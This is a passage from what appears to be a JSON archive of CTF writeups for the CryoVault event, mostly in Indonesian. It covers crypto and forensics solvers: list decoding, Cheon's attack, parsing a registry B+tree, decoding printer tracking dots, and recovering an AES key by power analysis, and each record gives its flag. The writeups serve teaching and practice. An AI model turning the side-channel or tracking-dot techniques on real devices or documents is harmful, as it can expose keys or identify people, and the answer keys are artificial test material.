        "code": "#!/usr/bin/env python3\n\"\"\"half-truths: multiplicity-one Sudan list decoding + AES-GCM verification.\n\nReads output.json in this folder; does not rely on known flag or honest indices.\n\"\"\"\nimport json\nimport time\nfrom pathlib import Path\n\nimport numpy as np\nfrom sympy import Poly, symbols\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom hashlib import sha256\n\nBASE = Path(__file__).resolve().parent\nD = 180  # 185 > D, and weighted monomials with i+39*j <= D exceed 512.\n\n\ndef interpolate(shares, p, k):\n    terms = [(i, j) for j in range(D // (k - 1) + 1)\n             for i in range(D - (k - 1) * j + 1)]\n    rows, cols = len(shares), len(terms)\n    print(f\"[*] Sudan interpolation: {rows} points, {cols} monomials, degree {D}\", flush=True)\n    assert cols > rows\n    M = np.empty((rows, cols), dtype=np.int64)\n    for index, (x, y) in enumerate(shares):\n        xp = [1] * (D + 1)\n        yp = [1] * (D // (k-1) + 1)\n        for i in range(1, len(xp)):\n            xp[i] = xp[i-1] * x % p\n        for j in range(1, len(yp)):\n            yp[j] = yp[j-1] * y % p\n        M[index, :] = [xp[i] * yp[j] % p for i, j in terms]\n\n    pivots = []\n    row = 0\n    for col in range(cols):\n        if row == rows:\n            break\n        candidates = np.flatnonzero(M[row:, col])\n        if len(candidates) == 0:\n            continue\n        idx = row + int(candidates[0])\n        if idx != row:\n            M[[idx, row], :] = M[[row, idx], :]\n        inv = pow(int(M[row, col]), -1, p)\n        M[row, col:] = (M[row, col:] * inv) % p\n        if row + 1 < rows:\n            factors = M[row+1:, col].copy()\n            # Intermediate values stay <2^62, safely inside signed int64.\n            M[row+1:, col:] = (M[row+1:, col:] - factors[:, None] * M[row, col:]) % p\n        pivots.append(col)\n        row += 1\n        if row % 64 == 0:\n            print(f\"[*] Linear algebra: {row}/{rows} pivots\", flush=True)\n    print(f\"[+] Interpolation rank: {row}/{rows}\", flush=True)\n    free = [i for i in range(cols) if i not in set(pivots)]\n    print(f\"[+] Nullity: {len(free)}, free columns: {free}\", flush=True)\n\n    # Produce a basis for the interpolation kernel. Q(x,f(x)) == 0 since\n    # deg_x Q(x,f(x)) <= D and it has 185 > D roots.\n    polynomials = []\n    for free_col in free:\n        vec = [0] * cols\n        vec[free_col] = 1\n        for r in range(row-1, -1, -1):\n            c = pivots[r]\n            z = sum(int(v) * vec[j] for j, v in enumerate(M[r, c+1:], c+1) if v and vec[j])\n            vec[c] = -z % p\n        polynomials.append({term: v for term, v in zip(terms, vec) if v})\n    return polynomials\n\n\ndef evaluate(coeffs, x, p):\n    z = 0\n    for a in reversed(coeffs):\n        z = (z*x+a) % p\n    return z\n\n\ndef lift_f(Q, p, k):\n    # Q is viewed as a polynomial in y with polynomial coefficients in x.\n    ydeg = max(j for i, j in Q)\n    q_by_y = [[0] * k for _ in range(ydeg+1)]\n    for (i, j), v in Q.items():\n        if i < k:\n            q_by_y[j][i] = v\n    t = symbols('t')\n    q0 = Poly(sum(q_by_y[j][0] * t**j for j in range(ydeg+1)), t, modulus=p)\n    if q0.is_zero or q0.degree() == 0:\n        raise ValueError('Bad Q(0,y): choose another kernel combination')\n    roots = []\n    for factor, multiplicity in q0.factor_list()[1]:\n        if factor.degree() == 1:\n            a,b = [int(z) % p for z in factor.all_coeffs()]\n            roots.append((-b * pow(a, -1, p)) % p)\n    print(f\"[*] Candidate f(0) roots: {len(roots)}\", flush=True)\n    for f0 in roots:\n        deriv = sum(j*q_by_y[j][0]*pow(f0,j-1,p) for j in range(1,ydeg+1)) % p\n        if deriv == 0:\n            print('[*] Multiple root at f(0); trying another kernel vector')\n            continue\n        deriv_inv = pow(deriv, -1, p)\n        f = [f0]\n        for n in range(1,k):\n            # Set f[n] temporarily to zero. The coefficient [x^n] of\n            # Q(x,f(x)) is linear in f[n], with multiplier Q_y(0,f0).\n            powers = [[0]*(n+1) for _ in range(ydeg+1)]\n            powers[0][0] = 1\n            for j in range(1,ydeg+1):\n                for a in range(n+1):\n                    powers[j][a] = sum(powers[j-1][a-b]*f[b] for b in range(min(a,len(f)-1)+1)) % p\n            residue = 0\n            for j in range(ydeg+1):\n                residue += sum(q_by_y[j][a]*powers[j][n-a] for a in range(n+1))\n            f.append(-residue*deriv_inv % p)\n        yield f\n\n\ndef main():\n    data = json.loads((BASE/'output.json').read_text())\n    p, k, n, t = (data[a] for a in ('p','k','n','t'))\n    shares = sorted(map(tuple,data['shares']))\n    assert (p,k,n,t) == (2147483647,40,512,185)\n    assert len(set(x for x,y in shares)) == 512\n    assert sum(D-(k-1)*j+1 for j in range(D//(k-1)+1)) > n\n    st = time.monotonic()\n    polynomials = interpolate(shares, p, k)\n    for idx,Q in enumerate(polynomials):\n        print(f\"[*] Factoring interpolation polynomial {idx+1}/{len(polynomials)}\", flush=True)\n        try:\n            polys = lift_f(Q,p,k)\n            for f in polys:\n                agree = [x for x,y in shares if evaluate(f,x,p) == y]\n                print(f\"[*] Recovered polynomial agrees on {len(agree)}/{n} shares\", flush=True)\n                if len(agree) != t: continue\n                key = sha256(','.join(map(str,f)).encode()).digest()\n                ciphertext = bytes.fromhex(data['flag_ct'])\n                tag = bytes.fromhex(data['flag_tag'])\n                nonce = bytes.fromhex(data['flag_nonce'])\n                flag = AESGCM(key).decrypt(nonce,ciphertext+tag,None)\n                print('[+] Exact 185 shares matched; AES-GCM tag verified!')\n                print('[+] Honest x positions:',agree)\n                print('[+] Coefficients (low-to-high):',f)\n                print(f'[+] Completed in {time.monotonic()-st:.2f}s')\n                print('<FLAG>'+flag.decode()+'</FLAG>')\n                return\n        except (ValueError,ArithmeticError) as exc:\n            print(f'[*] Failed for this Q: {exc}',flush=True)\n    raise RuntimeError('No polynomial passed both checks')\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{l1st_d3c0d1ng_p4st_th3_r4d1us}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-crypto-toxic-waste",
    "title": "Toxic-Waste",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Toxic-Waste",
    "problemDescription": "Challenge crypto berbasis SRS (structured reference string) dengan hanya dua titik:\n`A = g^tau (mod P)` dan `B = g^(tau^d) (mod P)`.\nWalaupun `tau` adalah eksponen DLP di grup berorde prima `q`, pasangan endpoint ini\nmemungkinkan **Cheon's attack** dengan biaya `O(sqrt((q-1)/d) + sqrt(d))` operasi grup.\n\nFlag dipulihkan dengan menentukan `tau`, membuat kunci `SHA256(str(tau))`, lalu membuka AES-GCM.",
    "tools": [],
    "analysis": "Dari `chall.py`:\n\n```python\nq - 1 == d * m\nd = 1 << 44\nA = pow(g, tau, P)\nB = pow(g, pow(tau, d, q), P)\nkey = sha256(str(tau).encode()).digest()\n```\n\nPada instance:\n\n```text\nq   = 197421955852454159089401857\nm   = 11222138928841 (44-bit prima)\nd   = 17592186044416 = 2^44\nz   = 3  (primitive root pada GF(q)*)\n```\n\n`P` adalah ambient prime 1024-bit dan `g` berada di subgrup berorde `q`.\nGrup eksponen `GF(q)*` mempunyai orde `q-1 = m*d` yang bisa dieksploitasi.\n\nMisalkan `tau = z^a (mod q)` dengan `z = 3`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `chall.py`: generator parameter, kunci rahasia, dan ciphertext.\n- `output.json`: parameter publik serta ciphertext AES-GCM.\n- `cheon.cpp`: implementasi BSGS dua tahap dengan GMP/C++ dan empat thread.\n- `solve.py`: wrapper compile, recovery, verifikasi `A`/`B`, dan dekripsi AES-GCM."
      },
      {
        "title": "Tahap 1: Memulihkan `a mod m` dari B",
        "content": "Karena `B = g^(tau^d)`:\n\n\n\nJadi `B = g^(w1^a)` dan kita perlu mencari `a` modulo `m`.\n\nMetode BSGS memakai `M = ceil(sqrt(m))`:\n\n- Baby: `baby[j] = g^(w1^j) mod P`, dengan `0 <= j < M`.\n- Giant: `giant[i] = B^(w1^(-i*M) mod q) mod P`.\n- Cari collision `baby[j] == giant[i]`, lalu `a0 = i*M + j (mod m)`.\n\nTidak perlu DLP generik berukuran 88 bit, sebab kita memanfaatkan relasi endpoint.\n\nHasil nyata:",
        "code": "B = g^((z^d)^a)\nw1 = z^d mod q       (orde w1 = m)"
      },
      {
        "title": "Tahap 2: Memulihkan sisa eksponen dari A",
        "content": "Karena `a = a0 + k*m`, definisikan:\n\n\n\nUlangi BSGS menggunakan basis `w2` dan target `A0`, dengan `M = sqrt(d)`.\n\nHasil nyata:\n\n\n\nGabungkan hasil:\n\n\n\nHasil akhir:",
        "code": "tau0 = z^a0 mod q\nw2   = z^m  mod q   (orde w2 = d)\nA0   = A^(inverse(tau0, q)) mod P\n     = g^(w2^k)"
      },
      {
        "title": "Verifikasi matematis",
        "content": "Nilai ini memenuhi kedua persamaan sumber secara eksak:\n\n\n\n`cheon.cpp` juga memeriksa kedua persamaan sebelum mencetak nilai `tau`.",
        "code": "assert pow(g, tau, P) == A\nassert pow(g, pow(tau, d, q), P) == B"
      },
      {
        "title": "Algoritma Validasi / Encoding",
        "content": "Flag dienkripsi dengan:\n\n\n\nKunci AES-256 hasil recovery:\n\n\n\nTag AES-GCM yang terdapat di `output.json` berhasil diverifikasi saat dekripsi.",
        "code": "key = sha256(str(tau).encode()).digest()\nAES.new(key, AES.MODE_GCM, nonce=bytes.fromhex(flag_nonce))"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Di direktori file challenge, jalankan:\n\n\n\nScript melakukan:\n\n1. Membaca `output.json` dan menyiapkan parameter untuk program GMP.\n2. Compile `cheon.cpp` menggunakan `g++ -O3 -std=c++17 -pthread -lgmp`.\n3. Menjalankan Cheon's attack dua tahap untuk mendapatkan `tau`.\n4. Memvalidasi kedua public value (tanpa mengubah binary/server).\n5. Menurunkan kunci AES dengan SHA-256 terhadap representasi desimal `tau`.\n6. Mendekripsi `flag_ct` menggunakan AES-GCM sekaligus memverifikasi authentication tag.\n\nPemulihan bukan brute-force 88 bit. Untuk instance ini, perhitungan dua tahap GMP selesai dalam ~141 detik menggunakan empat thread di lingkungan pengujian.",
        "code": "python3 -m pip install cryptography\npython3 solve.py"
      },
      {
        "title": "Catatan",
        "content": "Tidak dibutuhkan koneksi jaringan. Keamanan DLP individual pada `g^tau` tidak otomatis menjamin keamanan informasi gabungan `g^tau` dan `g^(tau^d)` ketika `d` membagi `q-1`.\n\nPenggunaan fingerprint 64 bit di tabel baby-step hanya untuk indeks pencarian; setiap collision diverifikasi ulang memakai eksponen dan elemen grup penuh, sehingga solusi tidak bergantung pada hash collision."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover tau using Cheon's two-endpoint SRS attack, then decrypt flag.\nRequires local C++ compiler, libgmp-dev, Python cryptography and output.json.\n\"\"\"\nimport hashlib\nimport json\nfrom pathlib import Path\nimport subprocess\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\nHERE = Path(__file__).resolve().parent\nDATA = json.loads((HERE / 'output.json').read_text())\n\n\ndef recover_tau():\n    params = HERE / 'params.txt'\n    params.write_text('\\n'.join(str(DATA[k]) for k in ('P','q','g','d','A','B')) + '\\n')\n    binary = HERE / 'cheon'\n    subprocess.run(['g++','-std=c++17','-O3','-pthread',str(HERE/'cheon.cpp'),'-lgmp','-o',str(binary)], check=True)\n    output = subprocess.check_output([str(binary),str(params),'4'], text=True)\n    print(output, end='')\n    return int(next(line.split('=',1)[1] for line in output.splitlines() if line.startswith('tau=')))\n\n\ndef main():\n    tau = recover_tau()\n    P, q, g, d = (DATA[k] for k in ('P','q','g','d'))\n    assert pow(g, tau, P) == DATA['A']\n    assert pow(g, pow(tau,d,q), P) == DATA['B']\n    key = hashlib.sha256(str(tau).encode()).digest()\n    flag = AESGCM(key).decrypt(bytes.fromhex(DATA['flag_nonce']), bytes.fromhex(DATA['flag_ct']+DATA['flag_tag']), None)\n    print('[+] AES-GCM authentication passed')\n    print('<FLAG>'+flag.decode()+'</FLAG>')\n\nif __name__=='__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{ch30n_8f_th3_c0mpr3ss3d_srs}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-frost-ledger",
    "title": "frost-ledger",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge frost-ledger",
    "problemDescription": "",
    "tools": [],
    "analysis": "Isi challenge terdiri dari `registry.fvr`, dokumentasi format, header SDK, log `fvregd`, dan `fvrctl`. `fvrctl` hanya menyisakan `info`, `stat`, dan `lsroot`, jadi record harus dibaca offline.\n\n```bash\n./usr/sbin/fvrctl info registry.fvr\n./usr/sbin/fvrctl stat registry.fvr\n./usr/sbin/fvrctl lsroot registry.fvr\n```\n\nVolume berisi 3072 halaman, format v1, dengan 291 halaman INDEX, 2619 DATA, dan 34 OVERFLOW. Ada 127 CRC mismatch pada halaman yang bukan bagian dari generasi live. Root slot epoch 291 bertanda `TORN`, jadi slot itu tidak dipakai. Root valid dengan epoch terbesar adalah epoch 290, `root_pgid=3039`.",
    "solution": [
      {
        "title": "Membaca B+tree",
        "content": "Catatan on-disk masih mendokumentasikan format v0. Header dan release notes menjelaskan bahwa format v1 memakai descriptor 16-byte dan alamat payload berbeda. Pada v1, `koff` dan `voff` menunjuk ke awal payload dengan jarak yang dihitung mundur dari ujung halaman.\n\nRoot 3039 adalah INDEX. Separator-nya berupa `seg/0052`, `seg/0112`, `seg/0171`, dan seterusnya. Karena `bay/07/thaw-authority` lebih kecil dari separator pertama, jalur turun menuju DATA page 3030. Di sana ditemukan descriptor:\n\n\n\nOverflow chain yang dirakit adalah `966 -> 2675 -> 184 -> 355`. Panjang hasil akhir tepat 2372 byte, sehingga chain tersebut konsisten. Byte hasil dimulai dengan `78 da`, lalu didekompresi memakai zlib.\n\n\n\nScript tersebut memilih root valid berdasarkan FNV-1a, mengikuti INDEX tree, membaca DATA page, berjalan melalui overflow chain, dan mencetak payload. Payload terkompresi didekode dengan:\n\n\n\nRecord hasil decoding menyatakan `record-version: 4`, `epoch: 290`, dan memuat field `authority-token`.",
        "code": "key        = bay/07/thaw-authority\nflags      = 0x2 (overflow)\nhead       = 966\nstored_len = 2372"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve_fvr.py`) is included below.",
        "code": "#!/usr/bin/env python3\nimport struct, sys, zlib\n\nPAGE = 4096\nTARGET = b\"bay/07/thaw-authority\"\n\ndef page(f, pgid):\n    f.seek(pgid * PAGE)\n    return f.read(PAGE)\n\ndef cells(p):\n    pgid, epoch, kind, _, n, crc, _ = struct.unpack_from('<IQBBHII', p, 0)\n    out = []\n    for i in range(n):\n        d = struct.unpack_from('<IHHII', p, 24 + i * 16)\n        koff, ksize, vsize, voff, flags = d\n        # Format v1 stores payload offsets backwards from the end of a page.\n        # In v1 koff/voff name the payload start measured backwards from the\n        # page end (the old v0 notes describe forward offsets instead).\n        key = p[PAGE - koff:PAGE - koff + ksize]\n        val = p[PAGE - voff:PAGE - voff + vsize]\n        out.append((key, val, flags, d))\n    return pgid, epoch, kind, out\n\ndef main(path):\n    with open(path, 'rb') as f:\n        # Highest epoch with a valid FNV-1a root slot is the live generation.\n        roots = []\n        f.seek(16)\n        for i in range(8):\n            raw = f.read(32)\n            epoch, root, wal, reserved, stored = struct.unpack('<QIIQQ', raw)\n            h = 0xcbf29ce484222325\n            for b in raw[:24]:\n                h ^= b\n                h = (h * 0x100000001b3) & 0xffffffffffffffff\n            if epoch and h == stored:\n                roots.append((epoch, root))\n        epoch, root = max(roots)\n        print(f'live root: epoch={epoch} pgid={root}')\n        pgid = root\n        while True:\n            p = page(f, pgid)\n            got, pe, kind, cs = cells(p)\n            print(f'page {pgid}: kind={kind} epoch={pe} cells={len(cs)}')\n            if kind == 1:\n                chosen = None\n                for key, val, flags, d in cs:\n                    print(f'  sep={key!r} child={struct.unpack(\"<I\", val)[0]}')\n                    if TARGET < key and chosen is None:\n                        chosen = struct.unpack('<I', val)[0]\n                if chosen is None:\n                    chosen = struct.unpack_from('<I', p, PAGE - 4)[0]\n                pgid = chosen\n                continue\n            if kind != 2:\n                raise RuntimeError(f'unexpected page kind {kind}')\n            matches = [(k, v, fl, d) for k, v, fl, d in cs if k == TARGET]\n            for k, v, fl, d in matches:\n                print(f'match flags=0x{fl:x} descriptor={d} value_len={len(v)}')\n                if fl & 2:\n                    head, total = struct.unpack('<QI', v)\n                    print(f'overflow head={head} stored_len={total}')\n                    chunks=[]; q=head\n                    while q:\n                        op=page(f,q)\n                        nxt, used=struct.unpack_from('<II',op,24)\n                        chunks.append(op[32:32+used]); print(f'  overflow page={q} used={used} next={nxt}')\n                        q=nxt\n                    payload=b''.join(chunks)\n                    if len(payload) != total: raise RuntimeError('overflow length mismatch')\n                else:\n                    payload=v\n                print('payload raw:', payload)\n                print('payload hex:', payload.hex())\n            break\n\nif __name__ == '__main__':\n    main(sys.argv[1])"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{stale_cow_67c1_root_fc8fe97f_backwards_heap}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-ghostinthespooler",
    "title": "Ghost in the Spooler",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Ghost in the Spooler",
    "problemDescription": "",
    "tools": [],
    "analysis": "Arsip berisi tiga artefak: `FP02CF4.SHD`, `FP02CF4.SPL`, dan `scan.png`. File `.SHD`/`.SPL` adalah sisa job print Windows; `scan.png` berisi hasil scan satu halaman memo.\n\n```bash\nfile FP02CF4.SHD FP02CF4.SPL scan.png\nstrings -el FP02CF4.SHD\nstrings -el FP02CF4.SPL\n```\n\nAda satu false positive: `file` mengira `.SPL` sebagai MATLAB v4, padahal bagian payload mulai offset `0x40` berisi signature ` EMF` dan record-record EMF. String UTF-16LE di dalamnya memperlihatkan konten dokumen, termasuk:\n\n- `MEMORANDUM`\n- `TO: All Directors, Human Resources`\n- `FROM: J. Holbrook, VP Total Rewards`\n- `DATE: 17 September 2024`\n- `RE: Q3 Compensation Adjustments (CONFIDENTIAL)`\n\nJudul, pengirim, penerima, dan isi memo tersebut cocok dengan halaman pada `scan.png`. Ini menghubungkan scan dengan payload print, bukan cuma kebetulan nama file.\n\n![Scanned memo with printer tracking dots](/assets/writeups/cryovault/foren-ghostinthespooler/scan.png)",
    "solution": [
      {
        "title": "Pemilik job dan waktunya",
        "content": "Header `.SHD` menyimpan offset string UTF-16LE. Pointer 32-bit little-endian di `0x10` menuju username pada `0x100`:\n\n\n\nHeader juga mencatat dokumen `Q3-Compensation-Adjustments.docx`, printer `Xerox DocuColor 12 PS`, dan workstation `FIN-WKS-014`.\n\nDelapan byte di offset `0x40` adalah timestamp Windows FILETIME little-endian, dihitung sejak 1601-01-01 UTC dalam unit 100 ns:\n\n\n\nTanggal `17 September 2024` di badan memo konsisten, tapi **tanggal memo bukan sumber timestamp cetak**. Waktu cetaknya berasal dari metadata `.SHD` dan nantinya diverifikasi secara independen lewat titik kuning.",
        "code": "j.holbrook"
      },
      {
        "title": "Identitas printer tersembunyi di scan",
        "content": "Di seluruh halaman ada titik kuning kecil berulang dengan jarak blok **300 px horizontal dan vertikal**. Satu blok terdiri atas **15 kolom × 8 baris**, tiap dot berjarak 9 px. Ini adalah *Machine Identification Code* (tracking dots) khas printer warna.\n\nDengan threshold pada warna kuning, posisi dot setiap blok identik. Dari 8 × 11 blok utuh, semua 88 menghasilkan pola yang sama:\n\n\n\n`R1` dipakai sebagai parity untuk kolom data, `C1` sebagai parity tiap baris. Setiap baris berjumlah bit ganjil, dan setiap kolom data `C2`–`C15` juga ganjil. Kolom `C1` sendiri berparity genap karena ada 14 kolom data.\n\nNilai setiap kolom diambil dari baris **R2–R8**, dengan bobot bit `64, 32, 16, 8, 4, 2, 1` (R1 tidak dihitung). Hasilnya:\n\n| Kolom | Nilai | Makna |\n|---|---:|---|\n| C2 | 37 | Menit |\n| C3 | 14 | Jam |\n| C4 | 17 | Tanggal |\n| C5 | 9 | Bulan |\n| C6 | 24 | Tahun (2024) |\n| C7–C13 | 8, 8, 4, 2, 0, 1, 3 | Serial `8842013` |\n| C14–C15 | 0, 0 | Kosong |\n\nJadi tracking dots mengkodekan:\n\n\n\nTimestamp dari titik kuning **persis sama dengan timestamp `.SHD`**, sampai ke menit. Ditambah kecocokan konten memo di `.SPL` dan scan, ketiga file bisa dikaitkan ke job cetak yang sama, dari workstation `FIN-WKS-014` menuju printer yang merekam serial `8842013`.",
        "code": "C1.............C15\nR1     000111000010111\nR2     100000000000000\nR3     010000000000000\nR4     100101000000000\nR5     001011110000000\nR6     011000001000000\nR7     001000000100100\nR8     010110000001100"
      },
      {
        "title": "Membentuk flag",
        "content": "Gabungkan tiga nilai sesuai format soal, tanpa spasi:\n\n\n\nSHA-256 dari string ASCII itu diambil 16 karakter hex pertama, lalu dimasukkan ke `isfcr{...}`.\n\nUntuk menjalankan solver lengkap (memeriksa 88 blok, parity, konten SPL, kecocokan dua timestamp, lalu menghitung flag):\n\n\n\nCore proses decoding dan pembentukan flag dari `solve.py`:\n\n\n\nOutput yang sudah diuji:\n\n\n\n**Flag: `isfcr{e24d16be9d731cba}`**",
        "code": "j.holbrook|8842013|2024-09-17T14:37:00Z"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover owner, Xerox tracking-dot serial, UTC print time, and flag.\nRun from anywhere: python3 solve.py (requires Pillow).\n\"\"\"\nfrom pathlib import Path\nfrom datetime import datetime, timedelta, timezone\nfrom hashlib import sha256\nimport struct\nfrom PIL import Image\n\nROOT = Path(__file__).resolve().parent\nshd = (ROOT / 'FP02CF4.SHD').read_bytes()\nspl = (ROOT / 'FP02CF4.SPL').read_bytes()\n\n\ndef utf16_z(buf: bytes, offset: int) -> str:\n    end = offset\n    while end < len(buf) - 1 and buf[end:end + 2] != b'\\x00\\x00':\n        end += 2\n    return buf[offset:end].decode('utf-16le')\n\n# SHD format: pointer to UTF-16 username at 0x10, FILETIME at 0x40.\nowner_offset = struct.unpack_from('<I', shd, 0x10)[0]\nusername = utf16_z(shd, owner_offset).lower()\nticks = struct.unpack_from('<Q', shd, 0x40)[0]\nshd_time = datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=ticks // 10)\nprint_timestamp = shd_time.strftime('%Y-%m-%dT%H:%M:%SZ')\n\n# Distinguish the spool payload from an arbitrary scan: matching memo content.\nassert b'M\\x00E\\x00M\\x00O\\x00R\\x00A\\x00N\\x00D\\x00U\\x00M\\x00' in spl\nassert 'Q3 Compensation Adjustments' in spl.decode('utf-16le', 'ignore')\nprint('SHD username:', username)\nprint('SHD document:', utf16_z(shd, struct.unpack_from('<I', shd, 0x18)[0]))\nprint('SHD printer:', utf16_z(shd, struct.unpack_from('<I', shd, 0x24)[0]))\nprint('SHD UTC:', print_timestamp)\nprint('SPL confirms memo title and content.')\n\n# scan.png repeats a 15-column x 8-row Xerox tracking-dot pattern\n# every 300 pixels. The top-left yellow dot center is x=90, y=60.\n# Original sheet contains 8 complete repeats horizontally, 11 vertically.\nim = Image.open(ROOT / 'scan.png').convert('RGB')\n\n\ndef yellow_dot(x: int, y: int) -> int:\n    r, g, b = im.getpixel((x, y))\n    return int(r > 210 and g > 180 and b < 200 and r - b > 50)\n\n\ndef decode_pattern(tile_x: int, tile_y: int) -> list[list[int]]:\n    return [[yellow_dot(90 + tile_x * 300 + 9*c,\n                        60 + tile_y * 300 + 9*r)\n             for c in range(15)] for r in range(8)]\n\nbits = decode_pattern(0, 0)\n# Check every other complete tracking-dot block; one corrupt scan block\n# doesn't silently change the recovered serial.\nfor ty in range(11):\n    for tx in range(8):\n        assert decode_pattern(tx, ty) == bits, f'MIC mismatch in tile {tx},{ty}'\n\n# Row 1 sets odd parity for data columns C2..C15; C1 ensures odd row parity.\n# Because there are 14 data columns, C1 itself has even column parity.\nassert all(sum(row) % 2 == 1 for row in bits), 'row MIC parity failed'\nassert all(sum(bits[r][c] for r in range(8)) % 2 == 1\n           for c in range(1, 15)), 'data-column MIC parity failed'\nassert sum(bits[r][0] for r in range(8)) % 2 == 0, 'C1 parity failed'\n\n# Rows 2..8 are the 7 data bits, MSB first.\nvalues = [sum(bits[r][c] << (7-r) for r in range(1, 8))\n          for c in range(15)]\n# C2: minute, C3: hour, C4: day, C5: month, C6: year (2000+YY).\nmic_time = datetime(2000 + values[5], values[4], values[3],\n                    values[2], values[1], tzinfo=timezone.utc)\nserial = ''.join(str(values[c]) for c in range(6, 13))  # C7..C13\nassert len(serial) == 7 and serial.isdecimal()\nassert values[13:] == [0, 0], 'unexpected data in reserved columns'\nassert mic_time == shd_time, f'MIC {mic_time} vs SHD {shd_time}'\n\npayload = f'{username}|{serial}|{print_timestamp}'\nflag = 'isfcr{' + sha256(payload.encode('ascii')).hexdigest()[:16] + '}'\nprint('MIC data columns C2..C15:', values[1:])\nprint('MIC printer serial:', serial)\nprint('MIC UTC:', mic_time.strftime('%Y-%m-%dT%H:%M:%SZ'))\nprint('Preimage:', payload)\nprint(f'<FLAG>{flag}</FLAG>')"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{e24d16be9d731cba}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-phantommesh",
    "title": "Phantom Mesh",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Phantom Mesh",
    "problemDescription": "",
    "tools": [],
    "analysis": "`chall.zip` berisi `mesh.pcap`, `traces/iq.npz`, daftar nonce, dan dua catatan vendor. Capture memakai IEEE 802.15.4; payload LMP-nya memuat `SECURE_REPORT` terenkripsi. Catatan SDR menyebut 2.500 rekaman I/Q yang masing-masing diambil saat perangkat mengirim `KEY_CONFIRM`, dengan nonce yang diketahui.",
    "solution": [
      {
        "title": "Kunci Trust Center dari trace",
        "content": "`KEY_CONFIRM` tidak terenkripsi. Vendor menjelaskan tag-nya sebagai hasil AES-128 atas nonce, dipotong menjadi 8 byte. Jadi nonce di CSV menjadi input yang diketahui untuk analisis korelasi daya (CPA). Saya gunakan magnitudo I/Q sebagai sinyal, lalu korelasikan sampel terhadap model Hamming weight `SBOX(nonce_byte XOR kandidat_kunci)` untuk setiap byte kunci. Puncak korelasi per byte memberi kunci:\n\n\n\nScript CPA ada di `phantom-mesh/cpa.py`. Kandidat ini terverifikasi langsung terhadap delapan tag `KEY_CONFIRM` di PCAP: AES-ECB dengan input nonce menghasilkan 8 byte pertama yang sama persis dengan `confirm_tag`.",
        "code": "7cf8b0b78be9f36a225c1e70692e1e1c"
      },
      {
        "title": "Buka Transport Key dan laporan",
        "content": "Frame `TRANSPORT_KEY` memakai counter `0x64` dan source EUI-64 `0100aa25004b1200` (urutan little-endian pada paket). Dengan format nonce dan AAD dari catatan LMP, AES-CCM* terverifikasi membuka Network Key:\n\n\n\nNetwork Key ini berhasil memverifikasi MIC pada semua 96 frame `SECURE_REPORT`. Payload frame 81 memuat record dengan value berikut setelah header report:\n\n\n\nValue tersebut adalah ASCII flag.",
        "code": "ffa0be732cd8f56eae8caa21359baf06"
      },
      {
        "title": "Script ringkas untuk dekripsi",
        "content": "Potongan berikut menunjukkan parsing payload frame 81, membuka Transport Key, lalu mengonfirmasi report. Kunci TC diisi dengan hasil CPA di atas.",
        "code": "from Crypto.Cipher import AES\n\n# data = bytes.fromhex(payload_hex), termasuk header LMP 1c 03 11\n\ndef open_ccm(key, body):\n    sec, counter, eui = body[0], body[1:5], body[5:13]\n    ciphertext, mic = body[13:-4], body[-4:]\n    nonce = eui[::-1] + counter + bytes([sec])\n    aad = bytes([sec]) + counter + eui\n    cipher = AES.new(key, AES.MODE_CCM, nonce=nonce, mac_len=4)\n    cipher.update(aad)\n    return cipher.decrypt_and_verify(ciphertext, mic)\n\n# Transport-Key: body dimulai setelah tiga byte header LMP\n# nwk_key = open_ccm(tc_link_key, transport_body)\n# Untuk setiap SECURE_REPORT, panggil open_ccm(nwk_key, report_body)."
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{ph4nt0m_m3sh_h4rm0n1cs_un14sk_th3_tc_l1nk_k3y}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-foren-signedbutwhichoriginal",
    "title": "Signed, But Which Original?",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Signed, But Which Original?",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge hanya menyediakan `case.json` dan `entries.bin`. `entries.bin` diawali magic `ISFCRLOG`, lalu record-record berukuran big-endian. Strings langsung memperlihatkan manifest JSON, key IDs, incident ID, dan beberapa kandidat turunan.",
    "solution": [
      {
        "title": "Parsing log",
        "content": "Record type yang relevan:\n\n- type `1`: key record, termasuk public key dan nama principal\n- type `3`: manifest JSON dengan signer dan signature\n- type `4`: hubungan incident dengan asset\n- type `5`: checkpoint log\n\nIncident target `incident-d7be9442cb` menunjuk ke capture asset:\n\n`5fe33137c48b34086ca6c2c19723b4916fb13732e465759be10b96dcef825bcf`\n\nCapture tersebut punya ancestry yang memenuhi action constraint:\n\n\n\nManifest terakhir adalah:",
